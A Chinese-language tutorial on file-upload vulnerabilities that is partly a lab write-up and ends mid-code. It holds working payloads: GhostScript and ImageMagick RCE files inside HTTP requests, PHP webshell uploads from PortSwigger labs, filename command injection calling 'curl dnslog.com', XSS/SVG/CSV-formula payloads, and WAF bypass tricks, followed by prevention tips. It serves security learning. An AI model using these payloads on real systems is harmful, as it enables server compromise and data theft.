[{"content":"1.漏洞介绍 文件上传漏洞是指Web服务器允许用户将文件上传到其文件系统，而不充分验证文件的名称、类型、内容或大小等内容。如果不能正确地执行这些限制，可能意味着即使是基本的图像上传功能也可以用来上传任意的和潜在危险的文件。这甚至可以包括支持远程代码执行的服务器端脚本文件\n2.传统的文件上传漏洞 2.1.文件上传黑名单过滤和白名单 白名单：白名单文件上传提示词一般为只允许上传png和jpg文件\n黑名单：黑名单一般上传时的提示为禁止上传xxxphp后缀文件\n2.2.文件上传后缀扩展名 常见php后缀扩展名\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 在 PHP 环境下，有些服务器可能允许上传扩展名为 .php5、.phtml 等的文件。 这些后缀仍然会被解析为 PHP 脚本，因此可以用于绕过检查。 .php .pht .phtm .phtml .phar .phpt .pgif .phps .phtml .php2 .php3 .php4 .php5 .php6 .php7 .php16 .inc \u0026lt;FILE\u0026gt;.php%20 \u0026lt;FILE\u0026gt;.php%0d%0a.jpg \u0026lt;FILE\u0026gt;.php%0a \u0026lt;FILE\u0026gt;.php.jpg \u0026lt;FILE\u0026gt;.php%00.gif \u0026lt;FILE\u0026gt;.php\\x00.gif \u0026lt;FILE\u0026gt;.php%00.png \u0026lt;FILE\u0026gt;.php\\x00.png \u0026lt;FILE\u0026gt;.php%00.jpg \u0026lt;FILE\u0026gt;.php\\x00.jpg mv \u0026lt;FILE\u0026gt;.jpg \u0026lt;FILE\u0026gt;.php\\x00.jpg 常见JSP后缀扩展名\n1 2 3 4 5 .jsp .jspx .jsw .jsv .jspf ASP\n1 2 3 4 .asp .aspx .cer .asa 3.文件上传漏洞另类应用 文件上传利用Tips\n文件上传的另类应用_github xlsx xxe-CSDN博客\n3.1.Imagemagick组件漏洞 ImageMagic是一款图片处理工具，当传入一个恶意图片时，就有可能存在命令注入漏洞。\nImageMagick默认支持一种图片格式mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。\n影响ImageMagick 6.9.3-9以前的所有版本\n1 2 3 4 5 CVE-2016-3714 CVE-2022-44268 CVE-2020-29599 可在vulhub靶场进行复现 3.1.1.CVE-2016-3714漏洞复现 【漏洞复现】ImageMagick命令注入漏洞(CVE-2016–3714/15/16/17/18)_cve-2016-3714-CSDN博客\n创建1个txt文件，文件内容如下，重命名为jpg，上传，查看DNSlog平台是否有数据\n1 2 3 4 push graphic-context viewbox 0 0 640 480 fill \u0026#39;url(https://127.0.0.0/joker.jpg\u0026#34;|ping \u0026#34;DNSlog地址)\u0026#39; pop graphic-context 3.1.2.CVE-2022-44268ImageMagick任意文件读取漏洞 CVE-2022-44268：ImageMagick 7.1.0-49 容易受到信息泄露的攻击。当它解析PNG图像（例如，调整大小）时，生成的图像可能嵌入了任意远程文件的内容（如果ImageMagick二进制文件有权读取它）。\n1 2 3 4 EXP：https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2022-44268/poc.py python -m pip install pypng -i https://pypi.tuna.tsinghua.edu.cn/simple python poc.py generate -o poc.png -r /etc/passwd 将上传图像下载下来，使用脚本进行查看，即可实现任意文件读取\npython poc.py generate -o poc.png -r /etc/passwd\n3.2.GhostScript 1 2 3 CVE-2018-16509 CVE-2019-6116 CVE-2018-19475 3.2.1.CVE-2018-16509 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 创建1个png图片，内容为%!PS userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%id \u0026gt; /tmp/success \u0026amp;\u0026amp; cat /tmp/success) currentdevice putdeviceprops 上传后查看返回包 POST / HTTP/1.1 Host: 192.168.214.130:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------331114540028326551992702503634 Content-Length: 442 Origin: http://192.168.214.130:8080 Connection: close Referer: http://192.168.214.130:8080/ Upgrade-Insecure-Requests: 1 -----------------------------331114540028326551992702503634 Content-Disposition: form-data; name=\u0026#34;file_upload\u0026#34;; filename=\u0026#34;poc.png\u0026#34; Content-Type: image/png %!PS userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%id \u0026gt; /tmp/success \u0026amp;\u0026amp; cat /tmp/success) currentdevice putdeviceprops -----------------------------331114540028326551992702503634-- 3.2.2.CVE-2018-19475 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 创建1个png文件，内容为%!PS 0 1 300367 {} for {save restore} stopped {} if (%pipe%id \u0026gt; /tmp/success \u0026amp;\u0026amp; cat /tmp/success) (w) file直接上传即可 POST / HTTP/1.1 Host: 192.168.214.130:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------500820396316754453354438613 Content-Length: 328 Origin: http://192.168.214.130:8080 Connection: close Referer: http://192.168.214.130:8080/ Upgrade-Insecure-Requests: 1 -----------------------------500820396316754453354438613 Content-Disposition: form-data; name=\u0026#34;file_upload\u0026#34;; filename=\u0026#34;poc.png\u0026#34; Content-Type: image/png %!PS 0 1 300367 {} for {save restore} stopped {} if (%pipe%id \u0026gt; /tmp/success \u0026amp;\u0026amp; cat /tmp/success) (w) file -----------------------------500820396316754453354438613-- 3.2.3.CVE-2019-6116 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 POST / HTTP/1.1 Host: 192.168.214.130:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------2714102440226518071136189238 Content-Length: 2775 Origin: http://192.168.214.130:8080 Connection: close Referer: http://192.168.214.130:8080/ Upgrade-Insecure-Requests: 1 -----------------------------2714102440226518071136189238 Content-Disposition: form-data; name=\u0026#34;file_upload\u0026#34;; filename=\u0026#34;111.png\u0026#34; Content-Type: image/png %!PS % extract .actual_pdfpaintproc operator from pdfdict /.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def /exploit { (Stage 11: Exploitation...)= /forceput exch def systemdict /SAFER false forceput userparams /LockFilePermissions false forceput systemdict /userparams get /PermitFileControl [(*)] forceput systemdict /userparams get /PermitFileWriting [(*)] forceput systemdict /userparams get /PermitFileReading [(*)] forceput % update save restore % All done. stop } def errordict /typecheck { /typecount typecount 1 add def (Stage 10: /typecheck #)=only typecount == % The first error will be the .knownget, which we handle and setup the % stack. The second error will be the ifelse (missing boolean), and then we % dump the operands. typecount 1 eq { null } if typecount 2 eq { pop 7 get exploit } if typecount 3 eq { (unexpected)= quit } if } put % The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some % executable arrays onto the operand stack that contain .forceput, but are not % marked as executeonly or pseudo-operators. % % The routine was attempting to pass them to ifelse, but we can cause that to % fail because when the routine was declared, it used `bind` but many of the % names it uses are not operators and so are just looked up in the dictstack. % % This means we can push a dict onto the dictstack and control how the routine % works. \u0026lt;\u0026lt; /typecount 0 /PDFfile { (Stage 0: PDFfile)= currentfile } /q { (Stage 1: q)= } % no-op /oget { (Stage 3: oget)= pop pop 0 } % clear stack /pdfemptycount { (Stage 4: pdfemptycount)= } % no-op /gput { (Stage 5: gput)= } % no-op /resolvestream { (Stage 6: resolvestream)= } % no-op /pdfopdict { (Stage 7: pdfopdict)= } % no-op /.pdfruncontext { (Stage 8: .pdfruncontext)= 0 1 mark } % satisfy counttomark and index /pdfdict { (Stage 9: pdfdict)= % cause a /typecheck error we handle above true } \u0026gt;\u0026gt; begin \u0026lt;\u0026lt;\u0026gt;\u0026gt; \u0026lt;\u0026lt;\u0026gt;\u0026gt; { .actual_pdfpaintproc } stopped pop (Should now have complete control over ghostscript, attempting to read /etc/passwd...)= % Demonstrate reading a file we shouldnt have access to. (/etc/passwd) (r) file dup 64 string readline pop == closefile (Attempting to execute a shell command...)= flush % run command (%pipe%id \u0026gt; /tmp/success) (w) file closefile (All done.)= quit -----------------------------2714102440226518071136189238-- 4.Burp靶场文件上传 4.1.实验1：通过Webshell上传远程执行代码 无任何限制，直接上传脚本文件即可获取权限，但是好像上传木马文件无法连接\n1 2 直接利用php脚本读取文件内容 \u0026lt;?php echo file_get_contents(\u0026#39;/home/carlos/secret\u0026#39;); ?\u0026gt; 4.2.通过 Content-Type 限制绕过上传 Web shell 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 POST /my-account/avatar HTTP/2 Host: 0a960083046b51c380d0fd8c00300044.web-security-academy.net Cookie: session=gVRKRg0Wn07r8QzOfBYQq6jbDfLKYXVo User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: multipart/form-data; boundary=---------------------------116495972011795778901939541020 Content-Length: 534 Origin: https://0a960083046b51c380d0fd8c00300044.web-security-academy.net Referer: https://0a960083046b51c380d0fd8c00300044.web-security-academy.net/my-account?id=wiener Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers -----------------------------116495972011795778901939541020 Content-Disposition: form-data; name=\u0026#34;avatar\u0026#34;; filename=\u0026#34;burp.php\u0026#34; Content-Type: image/png \u0026lt;?php echo file_get_contents(\u0026#39;/home/carlos/secret\u0026#39;); ?\u0026gt; -----------------------------116495972011795778901939541020 Content-Disposition: form-data; name=\u0026#34;user\u0026#34; wiener -----------------------------116495972011795778901939541020 Content-Disposition: form-data; name=\u0026#34;csrf\u0026#34; 8SSaYWaf8VlsjPG5N4e4sctA4ZzVbFQC -----------------------------116495972011795778901939541020-- 4.3.通过路径遍历上传 Web shell 没用任何过滤，但是直接上传后不解析php语言\n通过更改上传路径实现绕过，跨目录进行文件上传，跨目录时需要url编码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 POST /my-account/avatar HTTP/2 Host: 0aeb00c80306bc758119ca3f0094003c.web-security-academy.net Cookie: session=wSmJblWurwOYn4bQEKtKlJtSt1CGSxfp User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: multipart/form-data; boundary=---------------------------115336827440672122532867175473 Content-Length: 554 Origin: https://0aeb00c80306bc758119ca3f0094003c.web-security-academy.net Referer: https://0aeb00c80306bc758119ca3f0094003c.web-security-academy.net/my-account Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers -----------------------------115336827440672122532867175473 Content-Disposition: form-data; name=\u0026#34;avatar\u0026#34;; filename=\u0026#34;..%2fburp.php\u0026#34; Content-Type: application/octet-stream \u0026lt;?php echo file_get_contents(\u0026#39;/home/carlos/secret\u0026#39;); ?\u0026gt; -----------------------------115336827440672122532867175473 Content-Disposition: form-data; name=\u0026#34;user\u0026#34; wiener -----------------------------115336827440672122532867175473 Content-Disposition: form-data; name=\u0026#34;csrf\u0026#34; blZH1Ly28wsFcd0RfXErJAS6UUY7tRrN -----------------------------115336827440672122532867175473-- 4.4.通过绕过扩展程序黑名单上传 Web shell 利用.htaccess进行绕过实现getshell，制作.htaccess文件\n1 2 AddType application/x-httpd-php .l33t 这将任意扩展名 ( .l33t) 映射到可执行 MIME 类型application/x-httpd-php。当服务器使用该mod_php模块时，它已经知道如何处理这个问题。 上传完成后，上传后缀为.l33t的文件，文件内容为php代码\n访问上传的文件即可解析为php文件，实现getshell等操作\n4.5.通过混淆文件扩展名上传 Web Shell 上传一个php后缀文件，提示只允许使用JPG和PNG文件，上传一个带php代码的png文件，发现不检测文件内容，和content-type字段\n通过修改后缀名，发现是白名单过滤，白名单过滤尝试截断后缀名%00\n4.6.通过多语言 Web shell 上传远程执行代码 文件类型 Magic Bytes（二进制值） JPG FF D8 FF E0 00 10 4A 46 49 46 GIF 47 49 46 38 39 61 PNG 89 50 4E 47 TIF 49 49 2A 00 BMP 42 4D 直接上传一个php后缀文件，提示文件不是有效图片，盲猜验证content-type字段或文件内容，先修改字段头为图片格式\n发现将content-type修改为图片字段后还是提示文件不是图片，猜测验证了图片内容，添加图片头\n添加图片头后成功上传，查看上传文件内容\n**4.7.**通过争用条件上传 Web shell 条件竞争实现绕过：现代框架更能抵御这类攻击。它们通常不会将文件直接上载到文件系统上的预定目的地。相反会采取一些预防措施，比如先上传到一个临时的沙箱目录，然后随机化名称以避免覆盖现有文件。然后对该临时文件执行验证，并仅在认为安全时才将其传输到目标。\n使用burp无限重复请求webshell.php地址\n自己直接上传webshell.php，利用burp的并发模块重复发送请求，实现条件竞争getshell\n5.SRC中文件上传挖掘思路 5.1.文件上传路径可控，任意文件覆盖？ 某SRC任意文件上传路径可控导致任意文件覆盖\n5.2.文件上传上传到存储桶，泄露存储桶AK/SK？ 5.3.文件上传XSS 【技术分享】文件上传XSS漏洞的利用方式\n5.3.1.PDFXSS（鸡肋，只能弹窗不能弹Cookie） xss.pdf\n5.3.2.SVGXSS 1 2 3 4 5 6 7 8 https://blog.csdn.net/weixin_50464560/article/details/123841210 https://zhuanlan.zhihu.com/p/323315064 在SVG图片中执行JS代码 \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; version=\u0026#34;1.1\u0026#34;\u0026gt; \u0026lt;circle cx=\u0026#34;100\u0026#34; cy=\u0026#34;50\u0026#34; r=\u0026#34;40\u0026#34; stroke=\u0026#34;black\u0026#34; stroke-width=\u0026#34;2\u0026#34; fill=\u0026#34;red\u0026#34; /\u0026gt; \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; \u0026lt;/svg\u0026gt; 5.3.3.html文件XSS 如果html XSS实在云存储地址触发一般不收，因为无法跨域，对于上传到云存储的可以找网站CDN地址实现危害提升达到跨域XSS\n如果上传在本地一般都有中低危害可以跨域\n5.3.4.XML文件XSS 1 2 3 4 5 6 7 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;something:script xmlns:something=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; alert(/xss/); \u0026lt;/something:script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 5.3.5.SWF后缀XSS 如果可以上传swf文件的话，可以利用SWFUpload 2.2.x版本存在XSS漏洞进行触发。一般很少碰到可以允许上传swf文件的情况。\n1.首先上传swfupload.swf文件，下面附上了下载地址。\n1 https://codeload.github.com/ntulip/swfupload-jquery-plugin/zip/refs/heads/master 2.将swfupload.swf文件进行上传，然后构造以下POC进行触发XSS漏洞\n1 swfupload.swf?movieName=\u0026#34;%5d%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%28/xss/%29;// 5.4.文件上传XXE 上传表格时可以进行测试\n利用EXCEL进行XXE攻击 - 先知社区\n5.4.1.xlsx xxe制作 新建1个xlsx文件，重命名为xxe.zip,解压\n解压后会产生这几个文件此时修改xl/workbook.xml并将以下内容插入第2行和第3行\n再次将文件压缩成xlsx文件，上传后看看dnslog地址有没有接收到请求\n5.5.导出CSV或Excel文件导致的本地命令执行 实战 | 登录处前台绕过getshell\nOWASP TOP 10 系列：CSV公式注入\n1 =1+cmd|\u0026#39; /C calc\u0026#39;!A0 5.6.远程图片加载+svg ssrf https://zhuanlan.zhihu.com/p/58271790\n1 \u0026lt;?xm l version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;no\u0026#34;?\u0026gt;\u0026lt;svg xm lns:svg=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xm lns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xm lns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;200\u0026#34;\u0026gt;\u0026lt;image height=\u0026#34;30\u0026#34; width=\u0026#34;30\u0026#34; xlink:href=\u0026#34;http://DNSlog/\u0026#34; /\u0026gt;\u0026lt;/svg\u0026gt; 5.7.文件上传RCE 有些文件上传时系统会对上传文件进行重命名此时会调用system命令，此时我们可以在文件名后面尝试执行命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 POST /AjaxService/Upload.aspx HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------361231835115122267584155400789 Content-Length: 359 Origin: null Connection: close Upgrade-Insecure-Requests: 1 -----------------------------361231835115122267584155400789 Content-Disposition: form-data; name=\u0026#34;Fdata\u0026#34;; filename=\u0026#34;test.jpg\u0026#34; Content-Type: image/jpeg 1.png || curl dnslog.com || .jpg -----------------------------361231835115122267584155400789 Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; Submin -----------------------------361231835115122267584155400789-- 5.8.上传zip导致的任意文件读取漏洞 https://www.youtube.com/watch?v=mnUaDCNaYwg\nhttps://www.youtube.com/watch?v=mnUaDCNaYwg\nhttp://v627ichb6z394aaa73tmjw5l6cc30uoj.oastify.com/\n上传文件getshell时可以先上传后缀为1.a文件，如果能够正常上传的话，直接访问上传文件，看是否会下载，如果直接访问下载那么就不用尝试能否getshell\n6.文件上传Bypass 分块传输\nWAF HTTP协议覆盖+分块传输组合绕过-腾讯云开发者社区-腾讯云\n实战 | Post文件上传WAF Bypass总结\n实战攻防-艰难打点之bypass绕过文件上传\n三个bypass案例分享\n文件上传漏洞 详细教程（最全讲解）-CSDN博客\n技巧收集之文件上传：WAF绕过\n文件上传绕过的一次思路总结（两个上传点组合Getshell）_asp文件上传绕过-CSDN博客\n6.1.filename改造 1 2 3 4 5 6 7 8 9 10 11 12 13 其余情况下，一般是对两个Content-Type和Content-Disposition字段做手脚，构造畸形包。比如说：filename多个等于号、单引号替换、取消引号 filename===================\u0026#34;1.php\u0026#34; filename=1.php filename=\u0026#39;1.php\u0026#39; Content-Disposition: form-data; name=\u0026#34;fileField\u0026#34;;aaaaaaaaaaaa*10000filename=\u0026#34;1.php\u0026#34; filename重写 filename=shell.jpg;filename=shell.jspx; filename=shell.jspx;filename=shell.jpg; 大小写 FileName=shell.jspx.jsp\u0026#39; 或者 重复和扩充Content-Disposition字段（另一种形式的垃圾参数），与此形式相同的还有重复filename：\n1 2 3 4 5 6 dwgdywisjngeruiwehwoeclms*10000 form-data; name=\u0026#34;fileField\u0026#34;; filename=\u0026#34;1.asp\u0026#34; Content-Disposition: form-data; name=\u0026#34;fileField\u0026#34;; filename=\u0026#34;1.jpg\u0026#34;; filename=\u0026#34;1.asp\u0026#34; 文件名垃圾参数 filename=\u0026#34;aaaaaaaaaaaaaaaaaaaaaa*1000.php\u0026#34; 换行/空格/回车\n1 2 3 4 5 6 7 8 9 10 filename=\u0026#34;1.a s p\u0026#34; filename=\u0026#34;1.asp \u0026#34; filename=\u0026#34;1.............................asp\u0026#34; 文件名字编码（filename一般为后端接收参数，编码了可能识别不到，这个就看情况） filename=\\u0073\\u0068\\u0065\\u006c\\u006c\\u002e\\u006a\\u0073\\u0070 filename前后加空白字符（ %20、%89、%8a、%8b、%0c、%0d、%1c、%1d、%1e、%1f）（对Java）：\n1 %0afilename%0a=\u0026#34;1.php\u0026#34; 对于第一个Content-Type，boundary中的垃圾参数：\n1 Content-Type: multipart/form-data; boundary（这里插入什么都行）=---------------------------4079122257244583541876801944 甚至插入 application/x-www-form-urlencoded ：\n1 Content-Type: multipart/form-data; boundaryapplication/x-www-form-urlencoded=---------------------------4079122257244583541876801944 7.文件上传漏洞预防 1 2 3 4 1.根据允许的扩展名白名单而不是禁止的扩展名黑名单检查文件扩展名。 2.重命名上传的文件以避免可能导致现有文件被覆盖的冲突。 3.在文件经过完全验证之前，不要将文件上传到服务器的永久文件系统。 4.尽可能使用已建立的框架来预处理文件上传，而不是尝试编写自己的验证机制。 8.Java文件上传 8.1.Spring架构实现文件上传 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;文件上传\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- 文件上传类型必须为file 文件上传方式必须为POST 文件上传编码格式enctype必须为:multipart/form-data --\u0026gt; \u0026lt;form action=\u0026#34;/upload\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;上传\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; @Controller @Slf4j public class UploadController { @PostMapping(\u0026#34;/upload\u0026#34;) public void upload(@RequestParam(\u0026#34;file\u0026#34;) MultipartFile file) throws IOException { log.info(\u0026#34;文件名:{}\u0026#34;,file.getOriginalFilename()); log.info(\u0026#34;文件大小:{}\u0026#34;,file.getSize()); // 获取上传的原始文件名 String Filename = file.getOriginalFilename(); System.out.println(Filename); //将接收的文件存储到本地磁盘目录中 file.transferTo(new File(\u0026#34;E:\\\\image\\\\\u0026#34;+Filename)); } } 备注： WEB-INF 目录为 JAVA WEB 中安全目录，该目录仅允许服务端访问，客户端无法访问。该目录下 有 web.xml 文件。\nspringboot项目默认不解析JSP内容，如果想要SpringBoot解析JSP页面，需要引入对应的依赖\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.servlet-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0.1\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;provided\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jstl\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-tomcat\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;provided\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat.embed\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-embed-jasper\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 在 spring配置文件添加一些配置信息\n1 2 3 4 5 spring: mvc: view: prefix: /jsp/ suffix: .jsp 注意：webapp目录不能放在resource目录下，不然会不解析，要和resource目录平级\n8.2.原生Servlet实现文件上传功能 ServletFileUpload 方式文件上传依赖 commons-fileupload 组件。 对于 commons-fileupload 组件介绍：FileUpload依据规范RFC1867中”基于表单的 HTML 文件上载”对 上传的文件数据进行解析，解析出来的每个项目对应一个 FileItem 对象。 每个 FileItem 都有我们可能所需的属性：获取contentType，获取原本的文件名，获取文件大小，获取 FiledName(如果是表单域上传)，判断是否在内存中，判断是否属于表单域等。 FileUpload使用FileItemFactory创建新的FileItem。该工厂可以控制每个项目的创建方式。目前提供的工 厂实现可以将项目的数据存储临时存储在内存或磁盘上，具体取决于项目的大小（即数据字节，在指定 的大小内时，存在内存中，超出范围，存在磁盘上）。 FileUpload 又依赖于 Commons IO。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.servlet-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;compile\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-fileupload\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-fileupload\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/commons-io/commons-io --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-io\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-io\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.4\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 import java.io.File; import java.io.FileOutputStream; import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.util.List; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.apache.commons.fileupload.FileItem; import org.apache.commons.fileupload.FileUploadException; import org.apache.commons.fileupload.ProgressListener; import org.apache.commons.fileupload.disk.DiskFileItemFactory; import org.apache.commons.fileupload.servlet.ServletFileUpload; /** * @author powerful */ public class FileUploadServlet extends HttpServlet { @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { try { //得到上传文件的保存目录。 将上传的文件存放于WEB-INF目录下，不允许外界直接访问，保证上传文件的安全 String realPath = this.getServletContext().getRealPath(\u0026#34;/upload\u0026#34;);// /WEB-INF/files System.out.println(\u0026#34;文件存放位置:\u0026#34;+realPath); //设置临时目录。 上传文件大于缓冲区则先放于临时目录中 String tempPath = \u0026#34;C:\\\\Users\\\\24767\\\\Desktop\\\\Java代码审计\\\\课件\\\\Java 文件操作之文件上传\\\\课件\\\\servletDemo\\\\src\\\\main\\\\webapp\u0026#34;; System.out.println(\u0026#34;临时文件存放位置:\u0026#34;+tempPath); //判断存放上传文件的目录是否存在（不存在则创建） File f = new File(realPath); if(!f.exists()\u0026amp;\u0026amp;!f.isDirectory()){ System.out.println(\u0026#34;目录或文件不存在! 创建目标目录。\u0026#34;); f.mkdir(); } //判断临时目录是否存在（不存在则创建） File f1 = new File(tempPath); if(!f1.isDirectory()){ System.out.println(\u0026#34;临时文件目录不存在! 创建临时文件目录\u0026#34;); f1.mkdir(); } /** * 使用Apache文件上传组件处理文件上传步骤： * * */ //1、设置环境:创建一个DiskFileItemFactory工厂 DiskFileItemFactory factory = new DiskFileItemFactory(); //设置上传文件的临时目录 